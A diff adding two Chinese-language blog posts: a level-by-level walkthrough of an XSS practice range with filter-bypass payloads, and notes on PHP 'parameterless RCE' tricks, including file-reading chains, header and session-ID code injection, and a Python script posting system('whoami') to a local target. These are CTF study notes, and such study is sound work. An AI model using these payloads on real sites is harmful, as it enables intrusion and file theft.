@@ -282,6 +282,374 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/03/05/XSS/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Wesaiii">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="WESAIIIのblog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2021/03/05/XSS/" itemprop="url">XSS</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-03-05T16:13:26+08:00">
+                2021-03-05
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p><a href="http://test.ctf8.com/" target="_blank" rel="noopener">xss闯关</a></p>
+<h6 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h6><p>没有过滤直接构造</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+<h6 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h6><p>没有过滤或用引号包裹参数，所输入代码被直接执行，导致形成XSS漏洞。</p>
+<p>我们可以闭合语句，直接在输入框输入payload：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>或者用<code>on</code>事件，需要点击一下输入框</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot; onclick&#x3D;alert(1)&gt;</span><br><span class="line">&quot; onmouseover&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&lt;img scr&#x3D;1 onerror&#x3D;&quot;alert(1)&quot;</span><br><span class="line">&quot;&gt;&lt;a href&#x3D;&quot;javascript:alert(1)&quot;&gt;123&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>
+
+<h6 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h6><p><code>htmlspecialchars()</code>函数将<code>&lt;&gt;</code>等一些字符实体化</p>
+<p>因此这里我们采用 <code>onclick</code>触发事件 <code>onclick</code> 事件直接包含在&lt;&gt;内，可直接被执行，观察源代码为单引号，把value给闭合掉,%0a用做换行使input标签语法正确，要再点一下输入框。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;onclick&#x3D;alert(1)%0a</span><br><span class="line">&#39;onclick&#x3D;&#39;javascript:alert(1)&#39;</span><br><span class="line">&#39;onmouseover&#x3D;&#39;alert(1)&#39;</span><br></pre></td></tr></table></figure>
+
+<h6 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h6><p><code>replace()</code>函数将<code>&lt;&gt;</code>替换为空</p>
+<p>使用<code>oninput</code>事件和<code>onchange</code>事件</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;onchange&#x3D;alert(1)&#x2F;&#x2F;</span><br><span class="line">&quot;oninput&#x3D;alert(1)&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+
+<h6 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h6><p><code>on</code>和<code>script</code>标签被过滤</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&lt;a href&#x3D;javascript:alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<h6 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h6><p><code>href</code>和<code>on</code>和<code>script</code>标签被过滤</p>
+<p>使用大小写绕过</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;Onclick&#x3D;&#39;javascript:alert(1)&#39;</span><br></pre></td></tr></table></figure>
+
+<h6 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h6><p><code>href</code>和<code>on</code>和<code>script</code>被过滤</p>
+<p>采用双写绕过</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&lt;sscriptcript&gt;alert(1)&lt;&#x2F;sscriptcript&gt;</span><br><span class="line">&quot;&gt;&lt;a hhrefref&#x3D;javasscriptcript:alert(1)&gt;</span><br><span class="line">&quot;oonnclick&#x3D;&#39;javasscriptcript:alert(1)&#39;</span><br></pre></td></tr></table></figure>
+
+<h6 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h6><p>过滤“和&lt;&gt;和javascript</p>
+<p>友情链接相当于<code>&lt;a&gt;</code>标签注入，使用HTML字符转换绕过，将<code>javascript</code>转换为十进制或十六进制</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">javascript:alert(1) &#x2F;&#x2F;再进行html字符转换</span><br></pre></td></tr></table></figure>
+
+<h6 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h6><p>判断链接中是否有http://</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">javascript:alert(1) &#x2F;&#x2F;http:&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+
+<h6 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h6><p>首先查看注入点，哪个的参数有回应哪个就是注入点，之后把<code>type</code>改为<code>text</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">keyword&#x3D;t_link&#x3D;1&amp;t_history&#x3D;2&amp;t_sort&#x3D;3</span><br><span class="line">&amp;t_sort&#x3D;&quot; type&#x3D;&quot;text&quot; onclick&#x3D;alert()%0a</span><br></pre></td></tr></table></figure>
+
+<h6 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h6><p><code>$str11=$_SERVER[&#39;HTTP_REFERER&#39;]</code>获得http请求中的<code>Referer</code></p>
+<p>抓包添加</p>
+<p><code>Referer:&quot;type=&quot;button&quot; onclick=&quot;javascript:alert(1)</code></p>
+<h6 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h6><p><code>$str11=$_SERVER[&#39;HTTP_USER_AGENT&#39;]</code>获得http请求中的<code>User-Agent</code></p>
+<p>抓包修改</p>
+<p><code>User-Agent:&quot;type=&quot;button&quot; onclick=&quot;javascript:alert(1)</code></p>
+<h6 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h6><p><code>$str11=$_COOKIE[&quot;user&quot;]</code>获得http请求中的<code>Cookie</code></p>
+<p>抓包修改</p>
+<p><code>Cookie:user=&quot;type=&quot;button&quot; onclick=&quot;javascript:alert(1)</code></p>
+<h6 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h6><p>过滤替换script和空格和/</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?keyword&#x3D;test&lt;img%0dsrc&#x3D;1%0donerror&#x3D;alert(1)&gt; </span><br><span class="line">?keyword&#x3D;&lt;a%0ahref&#x3D;“javasc%0aript:alert(1)”&gt;</span><br></pre></td></tr></table></figure>
+
+<h6 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h6><p>将两个输入值用等号连接.embeb标签定义嵌入的内容，比如插件。</p>
+<p> 添加空格使结构发生变化</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?arg01&#x3D;a&amp;arg02&#x3D; onmouseover&#x3D;alert(1)</span><br></pre></td></tr></table></figure>
+
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/03/05/%E6%97%A0%E5%8F%82%E6%95%B0rce/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Wesaiii">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="WESAIIIのblog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2021/03/05/%E6%97%A0%E5%8F%82%E6%95%B0rce/" itemprop="url">无参数rce</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-03-05T16:13:26+08:00">
+                2021-03-05
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="无参数RCE"><a href="#无参数RCE" class="headerlink" title="无参数RCE"></a>无参数RCE</h1><h3 id="常见形式"><a href="#常见形式" class="headerlink" title="常见形式"></a>常见形式</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'code'</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="无参数任意文件读取"><a href="#无参数任意文件读取" class="headerlink" title="无参数任意文件读取"></a>无参数任意文件读取</h3><h5 id="1-查看当前目录所有文件名"><a href="#1-查看当前目录所有文件名" class="headerlink" title="1.查看当前目录所有文件名"></a>1.查看当前目录所有文件名</h5><p><code>print_r(scandir(&#39;.&#39;));</code></p>
+<p>绝对路径：<code>print_r(realpath(&#39;.&#39;));</code></p>
+<p>​                   <code>print_r(scandir(getcwd()))</code></p>
+<p>如何构造参数<code>&quot;.&quot;</code>：</p>
+<p>1.<code>localeconv()</code>函数</p>
+<p>返回一包含本地数字及货币格式信息的数组。而数组第一项就是<code>&quot;.&quot;</code>。</p>
+<p>使用方法：<code>print_r(scandir(current(localeconv())));</code></p>
+<p>​                   <code>print_r(scandir(pos(localeconv())));</code>                            </p>
+<p>​                   <code>print_r(scandir(reset(localeconv())));</code></p>
+<p>2.构造<code>chr(46)</code></p>
+<p><code>chr(46)</code>就是字符<code>&quot;.&quot;</code></p>
+<p><code>current(localtime(time()))</code>最多60秒得到46</p>
+<p><code>ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))</code>返回46</p>
+<p><code>ord(hebrevc(crypt(time())))</code>概率返回46</p>
+<p><code>ord(strrev(crypt(serialize(array()))))</code>概率返回46</p>
+<h5 id="2-读取当前目录文件"><a href="#2-读取当前目录文件" class="headerlink" title="2.读取当前目录文件"></a>2.读取当前目录文件</h5><p><code>show_source()</code>、<code>readfile</code>、<code>highlight_file</code>、<code>file_get_contents</code>、<code>readgzfile()</code>函数可读取文件。</p>
+<p>查看文件名的方法输出的是数组，文件名是数组的值，使用如下函数改变指针位置读取文件的数组：</p>
+<p><code>current()/pos()</code>：返回数组中当前单元</p>
+<p><code>each()</code>：返回数组当前的键/值对并将数组指针前移一位</p>
+<p><code>end()</code>：将数组指针指向最后一个单元</p>
+<p><code>next()</code>：将数组指针向前移动一位</p>
+<p><code>prev()</code>：将数组指针倒回一位</p>
+<p>使用<code>array_reverse()</code> 以相反的元素顺序返回数组</p>
+<p>读倒数第二个数组：</p>
+<p><code>show_source(next(array_reverse(scandir(getcwd()))));</code></p>
+<p>使用<code>array_rand(array_flip())</code>，<code>array_flip()</code>交换数组的键和值</p>
+<p><code>show_source(array_rand(array_flip(scandir(current(localeconv())))));</code></p>
+<p>使用<code>array_rand()</code>随机返回一个数组</p>
+<p><code>show_source(array_rand(array_flip(scandir(getcwd()))));</code></p>
+<p>多刷新几次就能读到</p>
+<h5 id="3-查看上一级目录文件名"><a href="#3-查看上一级目录文件名" class="headerlink" title="3.查看上一级目录文件名"></a>3.查看上一级目录文件名</h5><p><code>dirname()</code> ：返回路径中的目录部分。若传入的绝对路径不包含文件名，则返回上一级目录路径；若包含文件名，则返回当前目录路径。</p>
+<p>查看上一级目录所有文件名：</p>
+<p><code>print_r(scandir(dirname(getcwd())));</code></p>
+<p>构造<code>&quot;..&quot;</code>：</p>
+<p><code>scandir(getcwd())</code>出现的数组第二个就是<code>&quot;..&quot;</code>，用<code>next()</code>获取</p>
+<p><code>print_r(scandir(next(scandir(getcwd()))));</code></p>
+<p><code>next(scandir(chr(ord(hebrevc(crypt(time()))))))</code>也可获得<code>&quot;..&quot;</code></p>
+<h5 id="4-读取上级目录文件"><a href="#4-读取上级目录文件" class="headerlink" title="4.读取上级目录文件"></a>4.读取上级目录文件</h5><p><code>chdir()</code> ：改变当前工作目录</p>
+<p>使用<code>dirname()</code>读取上级目录文件：</p>
+<p><code>show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));</code></p>
+<p>构造<code>&quot;..&quot;</code>切换路径并读取：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));</span><br><span class="line">或</span><br><span class="line">show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));</span><br><span class="line">或</span><br><span class="line">if(chdir(next(scandir(getcwd()))))show_source(array_rand(array_flip(scandir(getcwd()))));</span><br></pre></td></tr></table></figure>
+
+<h5 id="5-查看和读取根目录文件"><a href="#5-查看和读取根目录文件" class="headerlink" title="5.查看和读取根目录文件"></a>5.查看和读取根目录文件</h5><p><code>strrev(crypt(serialize(array())))</code>所获得的字符串第一位有几率是<code>/</code></p>
+<p>有一定权限才能读取到根目录文件：</p>
+<p><code>print_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));</code></p>
+<p>或</p>
+<p><code>if(chdir(chr(ord(strrev(crypt(serialize(array())))))))print_r(scandir(getcwd()));</code></p>
+<h3 id="无参数命令执行"><a href="#无参数命令执行" class="headerlink" title="无参数命令执行"></a>无参数命令执行</h3><p>1.<code>getallheaders()</code>和<code>apache_request_headers()</code>函数</p>
+<p>只能在<code>Apache</code>环境下使用：</p>
+<p><code>Payload:?code=eval(pos(getallheaders()))</code></p>
+<p>同时<code>post</code>数据<code>a=phpinfo()</code>或者修改<code>User-Agent</code>为<code>phpinfo()</code></p>
+<p>2.<code>get_defined_vars()</code>函数</p>
+<p>该函数会返回全局变量的值，如get、post、cookie、file数据</p>
+<p>使用<code>get</code>的数据：</p>
+<p><code>Payload:?leon=phpinfo();&amp;code=eval(pos(pos(get_defined_vars())));</code></p>
+<p>使用<code>file</code>的数据：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">  <span class="string">"system('whoami');"</span>: <span class="string">""</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#data = &#123;</span></span><br><span class="line"><span class="comment">#"code":"eval(pos(pos(end(get_defined_vars()))));"</span></span><br><span class="line"><span class="comment">#&#125;</span></span><br><span class="line">r = requests.post(<span class="string">'http://127.0.0.1/333/222/111/index.php?code=eval(pos(pos(end(get_defined_vars()))));'</span>, files=files)</span><br><span class="line">print(r.content.decode(<span class="string">"utf-8"</span>, <span class="string">"ignore"</span>))</span><br></pre></td></tr></table></figure>
+
+<p>3.<code>session_id()</code>函数</p>
+<p> 可以用来获取/设置 当前会话 ID。</p>
+<p>session需要使用<code>session_start()</code>开启，然后返回参数给<code>session_id()</code></p>
+<p>但是有一点限制：文件会话管理器仅允许会话 ID 中使用以下字符：a-z A-Z 0-9 ,（逗号）和 - 减号）</p>
+<p>但是<code>hex2bin()</code>函数可以将十六进制转换为ASCII 字符，所以我们传入十六进制并使用<code>hex2bin()</code>即可。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eval(hex2bin(session_id(session_start())));</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; print&#39;phpinfo();&#39;.encode(&#39;hex&#39;)</span><br><span class="line">706870696e666f28293b</span><br><span class="line"></span><br><span class="line">Cookie: PHPSESSID&#x3D;706870696e666f28293b</span><br></pre></td></tr></table></figure>
+
+<p>4.<code>getenv()</code> 函数</p>
+<p>获取环境变量的值(<code>PHP7.1</code>以后)</p>
+<p>方法同1</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/02/01/jwt/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -639,7 +1007,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-count">4</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
